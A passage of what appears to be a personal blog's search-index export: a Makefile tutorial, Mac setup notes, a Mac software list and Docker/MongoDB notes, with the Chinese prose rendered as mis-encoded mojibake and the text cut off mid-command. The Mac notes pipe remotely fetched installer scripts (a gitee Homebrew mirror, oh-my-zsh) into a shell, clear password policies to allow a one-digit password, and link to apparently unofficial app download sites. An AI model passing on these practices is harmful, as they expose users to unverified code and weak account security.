ä¸Š@ï¼Œå°±å¯ä»¥å…³é—­å›å£°ã€‚\n\n```makefile\ntest:\n    # è¿™æ˜¯æµ‹è¯•\n\ntest:\n    @# è¿™æ˜¯æµ‹è¯•\n```\n\n\n\n##### 2.3 é€šé…ç¬¦\n\né€šé…ç¬¦ï¼ˆwildcardï¼‰ç”¨æ¥æŒ‡å®šä¸€ç»„ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶åã€‚Makefile çš„é€šé…ç¬¦ä¸ Bash ä¸€è‡´ï¼Œä¸»è¦æœ‰æ˜Ÿå·ï¼ˆ*ï¼‰ã€é—®å·ï¼ˆï¼Ÿï¼‰å’Œ [...] ã€‚æ¯”å¦‚ï¼Œ *.o è¡¨ç¤ºæ‰€æœ‰åç¼€åä¸ºoçš„æ–‡ä»¶ã€‚\n\n```makefile\nclean:\n        rm -f *.o\n```\n\n\n\n##### 2.4 æ¨¡å¼åŒ¹é…\n\nMakeå‘½ä»¤å…è®¸å¯¹æ–‡ä»¶åï¼Œè¿›è¡Œç±»ä¼¼æ­£åˆ™è¿ç®—çš„åŒ¹é…ï¼Œä¸»è¦ç”¨åˆ°çš„åŒ¹é…ç¬¦æ˜¯%ã€‚æ¯”å¦‚ï¼Œå‡å®šå½“å‰ç›®å½•ä¸‹æœ‰ f1.c å’Œ f2.c ä¸¤ä¸ªæºç æ–‡ä»¶ï¼Œéœ€è¦å°†å®ƒä»¬ç¼–è¯‘ä¸ºå¯¹åº”çš„å¯¹è±¡æ–‡ä»¶ã€‚\n\n```\n%.o: %.c\n\nç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚\n\nf1.o: f1.c\nf2.o: f2.c\n```\n\nä½¿ç”¨åŒ¹é…ç¬¦%ï¼Œå¯ä»¥å°†å¤§é‡åŒç±»å‹çš„æ–‡ä»¶ï¼Œåªç”¨ä¸€æ¡è§„åˆ™å°±å®Œæˆæ„å»ºã€‚\n\n\n\n##### 2.5 å˜é‡å’Œèµ‹å€¼ç¬¦\n\nMakefile å…è®¸ä½¿ç”¨ç­‰å·è‡ªå®šä¹‰å˜é‡ã€‚\n\n```makefile\ntxt = Hello World\ntest:\n    @echo $(txt)\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡ txt ç­‰äº Hello Worldã€‚è°ƒç”¨æ—¶ï¼Œå˜é‡éœ€è¦æ”¾åœ¨ $( ) ä¹‹ä¸­ã€‚\n\n\n\nè°ƒç”¨Shellå˜é‡ï¼Œéœ€è¦åœ¨ç¾å…ƒç¬¦å·å‰ï¼Œå†åŠ ä¸€ä¸ªç¾å…ƒç¬¦å·ï¼Œè¿™æ˜¯å› ä¸ºMakeå‘½ä»¤ä¼šå¯¹ç¾å…ƒç¬¦å·è½¬ä¹‰ã€‚\n\n```makefile\ntest:\n    @echo $$HOME\n```\n\n\n\næœ‰æ—¶ï¼Œå˜é‡çš„å€¼å¯èƒ½æŒ‡å‘å¦ä¸€ä¸ªå˜é‡ã€‚\n\n```makefile\nv1 = $(v2)\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡ v1 çš„å€¼æ˜¯å¦ä¸€ä¸ªå˜é‡ v2ã€‚è¿™æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œv1 çš„å€¼åˆ°åº•åœ¨å®šä¹‰æ—¶æ‰©å±•ï¼ˆé™æ€æ‰©å±•ï¼‰ï¼Œè¿˜æ˜¯åœ¨è¿è¡Œæ—¶æ‰©å±•ï¼ˆåŠ¨æ€æ‰©å±•ï¼‰ï¼Ÿå¦‚æœ v2 çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œè¿™ä¸¤ç§æ‰©å±•æ–¹å¼çš„ç»“æœå¯èƒ½ä¼šå·®å¼‚å¾ˆå¤§ã€‚\n\nä¸ºäº†è§£å†³ç±»ä¼¼é—®é¢˜ï¼ŒMakefileä¸€å…±æä¾›äº†å››ä¸ªèµ‹å€¼è¿ç®—ç¬¦ ï¼ˆ=ã€:=ã€ï¼Ÿ=ã€+=ï¼‰ï¼Œå®ƒä»¬çš„åŒºåˆ«è¯·çœ‹[StackOverflow](http://stackoverflow.com/questions/448910/makefile-variable-assignment)ã€‚\n\n```bash\nVARIABLE = value\n# åœ¨æ‰§è¡Œæ—¶æ‰©å±•ï¼Œå…è®¸é€’å½’æ‰©å±•ã€‚\n\nVARIABLE := value\n# åœ¨å®šä¹‰æ—¶æ‰©å±•ã€‚\n\nVARIABLE ?= value\n# åªæœ‰åœ¨è¯¥å˜é‡ä¸ºç©ºæ—¶æ‰è®¾ç½®å€¼ã€‚\n\nVARIABLE += value\n# å°†å€¼è¿½åŠ åˆ°å˜é‡çš„å°¾ç«¯ã€‚\n```\n\n\n\n##### 2.6 å†…ç½®å˜é‡ï¼ˆImplicit Variablesï¼‰\n\nMakeå‘½ä»¤æä¾›ä¸€ç³»åˆ—å†…ç½®å˜é‡ï¼Œæ¯”å¦‚ï¼Œ`$(CC)` æŒ‡å‘å½“å‰ä½¿ç”¨çš„ç¼–è¯‘å™¨ï¼Œ`$(MAKE)` æŒ‡å‘å½“å‰ä½¿ç”¨çš„Makeå·¥å…·ã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº†è·¨å¹³å°çš„å…¼å®¹æ€§ï¼Œè¯¦ç»†çš„å†…ç½®å˜é‡æ¸…å•è§[æ‰‹å†Œ](https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html)ã€‚\n\n```makefile\noutput:\n    $(CC) -o output input.c\n```\n\n\n\n##### 2.7 è‡ªåŠ¨å˜é‡ï¼ˆAutomatic Variablesï¼‰\n\nMakeå‘½ä»¤è¿˜æä¾›ä¸€äº›è‡ªåŠ¨å˜é‡ï¼Œå®ƒä»¬çš„å€¼ä¸å½“å‰è§„åˆ™æœ‰å…³ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªã€‚\n\n+ ``$@``\n\n  `$@`æŒ‡ä»£å½“å‰ç›®æ ‡ï¼Œå°±æ˜¯Makeå‘½ä»¤å½“å‰æ„å»ºçš„é‚£ä¸ªç›®æ ‡ã€‚æ¯”å¦‚ï¼Œ`make foo`çš„`$@` å°±æŒ‡ä»£fooã€‚\n\n  ```bash\n  a.txt b.txt: \n      touch $@\n      \n  #ç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚    \n   \n  a.txt:\n      touch a.txt\n  b.txt:\n      touch b.txt\n  ```\n\n+ `$<`\n\n  `$<` æŒ‡ä»£ç¬¬ä¸€ä¸ªå‰ç½®æ¡ä»¶ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œé‚£ä¹ˆ`$<` å°±æŒ‡ä»£p1ã€‚\n\n  ```bash\n  a.txt: b.txt c.txt\n      cp $< $@ \n      \n  # ç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚\n  \n  a.txt: b.txt c.txt\n      cp b.txt a.txt \n  ```\n\n  \n\n+ `$?`\n\n  `$?` æŒ‡ä»£æ¯”ç›®æ ‡æ›´æ–°çš„æ‰€æœ‰å‰ç½®æ¡ä»¶ï¼Œä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œå…¶ä¸­ p2 çš„æ—¶é—´æˆ³æ¯” t æ–°ï¼Œ`$?`å°±æŒ‡ä»£p2ã€‚\n\n  \n\n+ `$^`\n\n  `$^` æŒ‡ä»£æ‰€æœ‰å‰ç½®æ¡ä»¶ï¼Œä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œé‚£ä¹ˆ `$^` å°±æŒ‡ä»£ p1 p2 ã€‚\n\n  \n\n+ `$*`\n\n  `$*` æŒ‡ä»£åŒ¹é…ç¬¦ % åŒ¹é…çš„éƒ¨åˆ†ï¼Œ æ¯”å¦‚% åŒ¹é… f1.txt ä¸­çš„f1 ï¼Œ`$*` å°±è¡¨ç¤º f1ã€‚\n\n  \n\n+ `$(@D)` å’Œ `$(@F)`\n\n  `$(@D)` å’Œ `$(@F)` åˆ†åˆ«æŒ‡å‘ `$@` çš„ç›®å½•åå’Œæ–‡ä»¶åã€‚æ¯”å¦‚ï¼Œ`$@`æ˜¯ src/input.cï¼Œé‚£ä¹ˆ`$(@D)` çš„å€¼ä¸º src ï¼Œ`$(@F)` çš„å€¼ä¸º input.cã€‚\n\n  \n\n+ `$(<D)` å’Œ `$(<F)`\n\n  `$(<D)` å’Œ `$(<F)` åˆ†åˆ«æŒ‡å‘ `$<` çš„ç›®å½•åå’Œæ–‡ä»¶åã€‚\n\n\n\nä¸‹é¢æ˜¯è‡ªåŠ¨å˜é‡çš„ä¸€ä¸ªä¾‹å­ã€‚\n\n```makefile\ndest/%.txt: src/%.txt\n    @[ -d dest ] || mkdir dest\n    cp $< $@\n```\n\nä¸Šé¢ä»£ç å°† src ç›®å½•ä¸‹çš„ txt æ–‡ä»¶ï¼Œæ‹·è´åˆ° dest ç›®å½•ä¸‹ã€‚é¦–å…ˆåˆ¤æ–­ dest ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±æ–°å»ºï¼Œç„¶åï¼Œ`$<` æŒ‡ä»£å‰ç½®æ–‡ä»¶ï¼ˆsrc/%.txtï¼‰ï¼Œ `$@` æŒ‡ä»£ç›®æ ‡æ–‡ä»¶ï¼ˆdest/%.txtï¼‰ã€‚\n\n\n\n##### 2.8 åˆ¤æ–­å’Œå¾ªç¯\n\nMakefileä½¿ç”¨ Bash è¯­æ³•ï¼Œå®Œæˆåˆ¤æ–­å’Œå¾ªç¯ã€‚\n\n```makefile\nifeq ($(CC),gcc)\n  libs=$(libs_for_gcc)\nelse\n  libs=$(normal_libs)\nendif\n```\n\nä¸Šé¢ä»£ç åˆ¤æ–­å½“å‰ç¼–è¯‘å™¨æ˜¯å¦ gcc ï¼Œç„¶åæŒ‡å®šä¸åŒçš„åº“æ–‡ä»¶ã€‚\n\n\n\n```makefile\nLIST = one two three\nall:\n    for i in $(LIST); do \\\n        echo $$i; \\\n    done\n\n# ç­‰åŒäº\n\nall:\n    for i in one two three; do \\\n        echo $i; \\\n    done\n```\n\nä¸Šé¢ä»£ç çš„è¿è¡Œç»“æœã€‚\n\n```bash\none\ntwo\nthree\n```\n\n\n\n##### 2.9 å‡½æ•°\n\nMakefile è¿˜å¯ä»¥ä½¿ç”¨å‡½æ•°ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n```bash\n$(function arguments)\n# æˆ–è€…\n${function arguments}\n```\n\n\n\nMakefileæä¾›äº†è®¸å¤š[å†…ç½®å‡½æ•°](http://www.gnu.org/software/make/manual/html_node/Functions.html)ï¼Œå¯ä¾›è°ƒç”¨ã€‚ä¸‹é¢æ˜¯å‡ ä¸ªå¸¸ç”¨çš„å†…ç½®å‡½æ•°ã€‚\n\n+ shell å‡½æ•°\n\n  shell å‡½æ•°ç”¨æ¥æ‰§è¡Œ shell å‘½ä»¤\n\n  ```makefile\n  srcfiles := $(shell echo src/{00..99}.txt)\n  ```\n\n  \n\n+ wildcard å‡½æ•°\n\n  wildcard å‡½æ•°ç”¨æ¥åœ¨ Makefile ä¸­ï¼Œæ›¿æ¢ Bash çš„é€šé…ç¬¦ã€‚\n\n  ```makefile\n  srcfiles := $(wildcard src/*.txt)\n  ```\n\n  \n\n+ subst å‡½æ•°\n\n  subst å‡½æ•°ç”¨æ¥æ–‡æœ¬æ›¿æ¢ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n  ```makefile\n  $(subst from,to,text)\n  ```\n\n  ä¸‹é¢çš„ä¾‹å­å°†å­—ç¬¦ä¸²\"feet on the street\"æ›¿æ¢æˆ\"fEEt on the strEEt\"ã€‚\n\n  ```makefile\n  $(subst ee,EE,feet on the street)\n  ```\n\n  \n\n+ patsubstå‡½æ•°\n\n  patsubst å‡½æ•°ç”¨äºæ¨¡å¼åŒ¹é…çš„æ›¿æ¢ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n  ```makefile\n  $(patsubst pattern,replacement,text)\n  ```\n\n  ä¸‹é¢çš„ä¾‹å­å°†æ–‡ä»¶å\"x.c.c bar.c\"ï¼Œæ›¿æ¢æˆ\"x.c.o bar.o\"ã€‚\n\n  ```makefile\n  $(patsubst %.c,%.o,x.c.c bar.c)\n  ```\n\n  \n\n+ æ›¿æ¢åç¼€å\n\n  æ›¿æ¢åç¼€åå‡½æ•°çš„å†™æ³•æ˜¯ï¼šå˜é‡å + å†’å· + åç¼€åæ›¿æ¢è§„åˆ™ã€‚å®ƒå®é™…ä¸Špatsubstå‡½æ•°çš„ä¸€ç§ç®€å†™å½¢å¼ã€‚\n\n  ```makefile\n  min: $(OUTPUT:.js=.min.js)\n  ```\n\n  ä¸Šé¢ä»£ç çš„æ„æ€æ˜¯ï¼Œå°†å˜é‡OUTPUTä¸­çš„åç¼€å .js å…¨éƒ¨æ›¿æ¢æˆ .min.js ã€‚\n\n\n\n### 3. Makefile çš„å®ä¾‹\n\n##### 3.1  åˆ é™¤\n\n```makefile\n.PHONY: cleanall cleanobj cleandiff\n\ncleanall : cleanobj cleandiff\n        rm program\n\ncleanobj :\n        rm *.o\n\ncleandiff :\n        rm *.diff\n```\n\nä¸Šé¢ä»£ç å¯ä»¥è°ƒç”¨ä¸åŒç›®æ ‡ï¼Œåˆ é™¤ä¸åŒåç¼€åçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨ä¸€ä¸ªç›®æ ‡ï¼ˆcleanallï¼‰ï¼Œåˆ é™¤æ‰€æœ‰æŒ‡å®šç±»å‹çš„æ–‡ä»¶ã€‚\n\n##### 3.2 ç¼–è¯‘Cè¯­è¨€é¡¹ç›®\n\n```makefile\nedit : main.o kbd.o command.o display.o \n    cc -o edit main.o kbd.o command.o display.o\n\nmain.o : main.c defs.h\n    cc -c main.c\nkbd.o : kbd.c defs.h command.h\n    cc -c kbd.c\ncommand.o : command.c defs.h command.h\n    cc -c command.c\ndisplay.o : display.c defs.h\n    cc -c display.c\n\nclean :\n     rm edit main.o kbd.o command.o display.o\n\n.PHONY: edit clean\n```\n\n\n\n##### 3.3 é¡¹ç›®\n\n```makefile\n.SILENT :\n.PHONY : dep vet clean dist package test\n\nNAME := cistern\nPRE := oc\nROOF := fhyx.tech/oceans/$(NAME)\n\nWITH_ENV = env `cat .env 2>/dev/null | xargs`\nUNAME_S := $(shell uname -s)\nifeq ($(UNAME_S),Darwin)\n    HOST := $(shell scutil --get LocalHostName)\nelse\n    HOST := $(shell hostname)\nendif\n\nDATE := $(shell date '+%Y%m%dT%H%M')\nSTAMP := $(shell date +%s)\nUSER := $(shell echo ${USER})\nTAG:=$(shell git describe --tags --always)\nLDFLAGS:=-X $(ROOF)/settings.Name=$(NAME) -X $(ROOF)/cmd.version=$(TAG) -X $(ROOF)/cmd.built=$(DATE) -X $(ROOF)/cmd.buildStamp=$(STAMP) -X $(ROOF)/cmd.buildUser=$(USER) -X $(ROOF)/cmd.buildHost=$(HOST)\n\nCOMMANDS = vet clean dist\n.PHONY: $(COMMANDS)\n\nmain:\n\techo \"Building $(NAME)\"\n\tgo build -ldflags \"$(LDFLAGS)\" .\n\nhelp:\n\t@echo \"commands: $(COMMANDS)\"\n\nall: clean $(COMMANDS)\n\nvet:\n\techo \"Checking .\"\n\tgo vet -vettool=$(which shadow) -atomic -bool -copylocks -nilfunc -printf -rangeloops -unreachable -unsafeptr -unusedresult ./...\n\nclean:\n\techo \"Cleaning dist\"\n\trm -rf dist\n\trm -f $(NAME) $(NAME)-*\n\ndist/linux_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of linux\"\n\tmkdir -p dist/linux_amd64 && GOOS=linux GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -s -w\" -o dist/linux_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist/darwin_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of darwin\"\n\tmkdir -p dist/darwin_amd64 && GOOS=darwin GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -w\" -o dist/darwin_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist: clean dist/linux_amd64/$(NAME) dist/darwin_amd64/$(NAME)\n\npackage: dist\n\techo \"Packaging $(NAME)\"\n\tls dist/linux_amd64 | xargs tar -cvJf $(NAME)-linux-amd64-$(TAG).tar.xz -C dist/linux_amd64\n\n.PHONY: binary-deploy\nbinary-deploy:\n\t@echo \"copy binary to earth\"\n\t@scp dist/linux_amd64/??-* earth:dist/linux_amd64/\n\n.PHONY: package-upload\npackage-upload:\n\t@echo \"copy package.tar.?z to venus\"\n\t@scp *-linux-amd64-*.tar.?z gopkg:/var/www/gopkg/\n\ndocker-build: dist/linux_amd64/$(NAME)\n\techo \"Building docker image\"\n\tcp -rf Dockerfile* dist/\n\tdocker build -t fhyx/cistern:$(TAG) dist/\n\tdocker tag fhyx/cistern:$(TAG) fhyx/cistern:latest\n.PHONY: $@\n```\n\n\n\n```go\npackage cmd\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\n\t\"github.com/spf13/cobra\"\n)\n\nvar (\n\tversion   = \"dev\"\n\tbuilt     = \"N/A\"\n\tbuildUser = \"None\"\n\tname      = \"cistern\"\n)\n\nvar versionCmd = &cobra.Command{\n\tUse:   \"version\",\n\tShort: \"Print the version number\",\n\tLong:  ``,\n\tRun: func(cmd *cobra.Command, args []string) {\n\t\tfmt.Printf(\"%s %s built %s by %s (%s %s-%s)\\n\", name, version, built, buildUser, runtime.Version(), runtime.GOOS, runtime.GOARCH)\n\t},\n}\n\nfunc init() {\n\tRootCmd.AddCommand(versionCmd)\n}\n\nfunc inDevelop() bool {\n\treturn version == \"dev\"\n}\n```\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ http://www.ruanyifeng.com/blog/2015/02/make.html\n+ https://blog.csdn.net/ruglcc/article/details/7814546\n+ http://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets\n","tags":["makefile"],"categories":["ç³»ç»Ÿ"]},{"title":"macè£…æœºæ“ä½œé…ç½®","url":"%2Fp%2Fa6af54c5.html","content":"\nè®°å½•ä¸€ä¸‹å¸¸ç”¨çš„macæ“ä½œé…ç½®ã€‚\n\n<!-- more -->\n\n# 1. æ“ä½œ\n\n### 1.1 è§¦å‘è§’\n\n<img src=\"macè£…æœºæ“ä½œé…ç½®/1.jpeg\" alt=\"1\" style=\"zoom:70%;\" />\n\n### 1.2 å¯†ç ä¿®æ”¹ä¸º1ä½æ•°\n\n```bash\npwpolicy -clearaccountpolicies\n```\n\nç„¶åå»ç³»ç»Ÿåå¥½è®¾ç½®->ç”¨æˆ·ä¸ç¾¤ç»„->ä¿®æ”¹å¯†ç \n\n### 1.3  æ˜¾ç¤ºéšè—æ–‡ä»¶\n\n```bash\ndefaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder\n```\n\n### 1.4 å›ºå®šF1-F12\n\nç³»ç»Ÿåå¥½è®¾ç½®->é”®ç›˜->è§¦æ§æ æ˜¾ç¤º\n\n### 1.5 æœ€å°åŒ–ç¨‹åºåˆ°åº”ç”¨å›¾æ ‡\n\nç³»ç»Ÿåå¥½è®¾ç½®->Dock->Mini windows into application icon\n\n### 1.6 è®¿è¾¾é…ç½®\n\n<img src=\"mac%E8%A3%85%E6%9C%BA%E6%93%8D%E4%BD%9C%E9%85%8D%E7%BD%AE/iShot_2022-06-25_15.16.46.png\" alt=\"iShot_2022-06-25_15.16.46\" style=\"zoom:87%;\" />\n\n# 2. é…ç½®\n\n### 2.1 å‰ç½®è½¯ä»¶\n\n+ ä¸‹è½½dropboxå’Œtypora\n\n<img src=\"mac%E8%A3%85%E6%9C%BA%E6%93%8D%E4%BD%9C%E9%85%8D%E7%BD%AE/image-20220108155908753.png\" style=\"zoom:50%;\" />\n\n+ è®¾ç½®git\n\n```bash\ngit config --global core.quotepath false\ngit config --global pull.rebase false\n\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email levonfly@gmail.com\n\ngit config --global user.name \"liuwei\"\ngit config --global user.email liuwei@funlink-tech.com\n```\n\n\n\n### 2.2 sshé…ç½®\n\n```bash\nln -s ~/Dropbox/_å¤šé‡å¤‡ä»½_/5\\ LevonConfig/Config/ssh  ~/.ssh\n\nsudo chmod 755 ~/.ssh\nsudo chmod 600 ~/.ssh/*\nsudo chown $USER ~/.ssh/*\n```\n\n\n\n### 2.3 ä¸‹è½½ä»“åº“\n\n```bash\ncd && mkdir workspace && cd workspace\n\ngit clone git@github.com:unix2dos/LevonConfig.git\ngit clone git@github.com:unix2dos/unix2dos.github.io.git\ngit clone git@github.com:unix2dos/dohttp.git\n```\n\n\n\n### 2.4 vimæ’ä»¶\n\n  ```bash\nln -s ~/Dropbox/_å¤šé‡å¤‡ä»½_/5\\ LevonConfig/Config/vim/.vimrc ~/.vimrc\n\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# è¿›å…¥vim\n:PlugInstall\n  ```\n\n\n\n### 2.5 zsh+tmux\n\n+ ä¸‹è½½Alacritty\n\n+ å®‰è£…brew\n\n  ```bash\n  /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\"\n  ```\n\n+ å®‰è£…zsh + tmux\n\n  ```bash\n  # å®‰è£…ohzsh\n  sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n  \n  git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n  \n  git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n  git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n  \n  # ä¸‹è½½å®‰è£…ç‰¹æ®Šå­—ä½“\n  https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k \n  \n  # å®‰è£…tmux\n  brew install tmux\n  cd ~ && git clone https://github.com/gpakosz/.tmux.git\n  ln -s -f .tmux/.tmux.conf\n  \n  ```\n\n+ é…ç½®\n\n  ```bash\n  ln -s ~/Dropbox/_å¤šé‡å¤‡ä»½_/5\\ LevonConfig/Config/zsh/.zshrc ~/.zshrc\n  ln -s ~/Dropbox/_å¤šé‡å¤‡ä»½_/5\\ LevonConfig/Config/tmux/.tmux.conf.local ~/.tmux.conf.local\n  ln -s ~/Dropbox/_å¤šé‡å¤‡ä»½_/5\\ LevonConfig/Config/alacritty/.alacritty.yml ~/.alacritty.yml\n  \n  tmux source-file ~/.tmux.conf\n  ```\n  \n    \n\n# 3. è½¯ä»¶\n\n### 3.1 rm åˆ é™¤åˆ°åƒåœ¾æ¡¶\n\n```bash\nbrew install trash\nalias rm=trash  # å»ºè®®æ”¾åˆ°.zshrcé‡Œ\n```\n\n","tags":["mac"],"categories":["ä½¿ç”¨"]},{"title":"macå¸¸ç”¨è½¯ä»¶","url":"%2Fp%2F2e385ebc.html","content":"\nè®°å½•ä¸€ä¸‹å¸¸ç”¨çš„macè½¯ä»¶ã€‚\n\n<!-- more -->\n\n# 1. ç³»ç»Ÿ\n\n+ f.lux ä¿æŠ¤è§†åŠ›\n\n  https://justgetflux.com/\n\n  \n\n+ Bob  è‹±è¯­ç¿»è¯‘\n\n  å·²è´­ä¹°ä»˜è´¹ï¼Œå»appstoreä¸‹è½½ã€‚\n\n  \n\n+ iShot é•¿æˆªå›¾\n\n  å·²è´­ä¹°ä»˜è´¹ï¼Œå»appstoreä¸‹è½½ã€‚\n\n  \n\n+ moom å¤šçª—å£ç®¡ç† \n\n  https://www.macwk.com/soft/moom\n\n  \n\n+ TotalFinder åŠ å¼ºfinder\n\n  https://totalfinder.binaryage.com/\n\n  \n\n+ Alfred æ•ˆç‡è½¯ä»¶\n\n  https://www.macwk.com/soft/alfred-4\n\n  \n\n+ Stretchly æé†’è½¯ä»¶\n\n  https://github.com/hovancik/stretchly/releases\n\n\n\n# 2. è®°å½•\n\n+ æœ‰é“äº‘ç¬”è®°ï¼Œmacä¸‹è½½å†å²ç‰ˆæœ¬V3.6.5\n\n  https://note.youdao.com/download.html\n\n  \n\n+ Typora markdownç¼–è¾‘å™¨\n\n  https://www.macwk.com/soft/typora\n\n  \n\n+ Microsoft To Do\n\n  å»appstoreä¸‹è½½ã€‚\n\n  \n\n+ XMind è„‘å›¾\n\n  https://www.macwk.com/soft/xmind\n\n  \n\n+ Anki  è®°å¿†ç¥å™¨ï¼Œmacå…è´¹ï¼Œiosä»˜è´¹ã€‚\n\n  https://apps.ankiweb.net/\n\n  \n\n+ ClearviewX ç”µå­ä¹¦é˜…è¯»\n\n  https://www.macwk.com/soft/clearview-x\n\n\n\n# 3. æ–‡ä»¶\n\n+ Dropbox æœ€ç‰›æ‰¹çš„ç½‘ç›˜\n\n  https://www.dropbox.com/install\n\n  \n\n+ Duplicate File Finder Pro é‡å¤æ–‡ä»¶æŸ¥æ‰¾\n\n  https://www.macwk.com/soft/duplicate-file-finder-pro\n\n  \n\n+ A Better Finder Rename æ‰¹é‡é‡å‘½åæ–‡ä»¶å\n\n  https://www.macwk.com/soft/a-better-finder-rename\n\n  \n\n+ Hazel æ•´ç†é—®é¢˜ç¥å™¨\n\n  https://www.macwk.com/soft/hazel\n\n  \n\n+ Imagine æ‰¹é‡å‹ç¼©å›¾ç‰‡\n\n  https://github.com/meowtec/Imagine/releases\n\n  \n\n+ PhotoBulk æ‰¹é‡ä¿®æ”¹å›¾ç‰‡å°ºå¯¸ï¼ŒåŠ æ°´å°\n\n  https://www.macwk.com/soft/photobulk\n\n\n\n# 4. ç¨‹åº\n\n+ Alacritty  \n\n  https://github.com/alacritty/alacritty/releases\n\n  \n\n+ ClashX Pro ä»£ç†\n\n  https://install.appcenter.ms/users/clashx/apps/clashx-pro/distribution_groups/public\n\n  \n\n+ Navicat Premium æ•°æ®åº“client\n\n  https://www.macwk.com/soft/navicat-premium\n\n  \n\n+ Another Redis Desktop Manager Redis client\n\n  https://github.com/qishibo/AnotherRedisDesktopManager/releases\n\n\n\n# 10. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/20432364/answer/660754448\n","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"dockerä¸­ä½¿ç”¨mongodb","url":"%2Fp%2F6fa8633a.html","content":"\n### 1. å®‰è£…\n\n##### 1.1 å®‰è£… mongodb\n\n```bash\nmkdir ~/data\n\nsudo docker pull mongo:latest \n\n# ä¸€å®šè¦æŠŠæ•°æ®å·æš´éœ²å‡ºå», è¿™æ ·æ–¹ä¾¿æ•°æ®è¿ç§»\nsudo docker run -d -p 27017:27017 --name mongo -v /home/liuwei/data:/data/db mongo:latest\n\nsudo docker exec -it mongo mongo\n```\n\n<!-- more -->\n\n\n\n##### 1.2 å°†æ•°æ®è¿ç§»åˆ°æ–°å®¹å™¨\n\nLet's start a new MongoDB container, this time running on port 37017 instead of the default 27017:\n\n```bash\n# Copy the data from the previous container \nsudo cp -r ~/data ~/data_clone  \n\n# Start another MongoDB container \nsudo docker run -d -p 37017:27017 -v ~/data_clone:/data/db mongo\n```\n\n\n\n### 2. ä½¿ç”¨\n\n```sql\ndb.createCollection('cities') \ndb.cities.insert({ name: 'New York', country: 'USA' }) \ndb.cities.insert({ name: 'Paris', country: 'France' }) \ndb.cities.find()\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://www.thachmai.info/2015/04/30/running-mongodb-container/\n\n+ docker-compose ä½¿ç”¨mongodb å‚è€ƒ {% post_link 2-linuxç³»ç»Ÿ/docker/docker-composeçš„ä¸€æ¬¡å®è·µ %}\n\n","tags":["mongodb"],"categories":["docker"]},{"title":"docker-composeçš„ä¸€æ¬¡å®è·µ","url":"%2Fp%2F331c471e.html","content":"\n\n\n### 0. å‰è¨€\n\nDocker Compose æ˜¯ Docker å®˜æ–¹ç¼–æ’ï¼ˆOrchestrationï¼‰é¡¹ç›®ä¹‹ä¸€ï¼Œè´Ÿè´£å¿«é€Ÿçš„éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ï¼Œå®ƒæ˜¯ç”± `python` ç¼–å†™ã€‚\n\n`Compose` å®šä½æ˜¯å®šä¹‰å’Œè¿è¡Œå¤šä¸ª Docker å®¹å™¨çš„åº”ç”¨ã€‚`Compose` æœ‰ä¸¤ä¸ªé‡ç‚¹\n\n- `docker-compose.yml` `compose` é…ç½®æ–‡ä»¶\n- `docker-compose` å‘½ä»¤è¡Œå·¥å…·\n\n<!-- more -->\n\n### 1. å®‰è£…\n\nwindows å’Œ mac ä¸­ `docker-compose` åœ¨å®‰è£… `docker` çš„æ—¶å€™å°±å·²ç»æ†ç»‘å®‰è£…äº†ã€‚linux ä¸­éœ€è¦è‡ªå·±å®‰è£…\n\n\n```bash\n# ç‰ˆæœ¬å¯ä»¥å» github æŸ¥çœ‹æœ€æ–°çš„ç‰ˆæœ¬\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-(uname -s)-(uname -m)\" -o 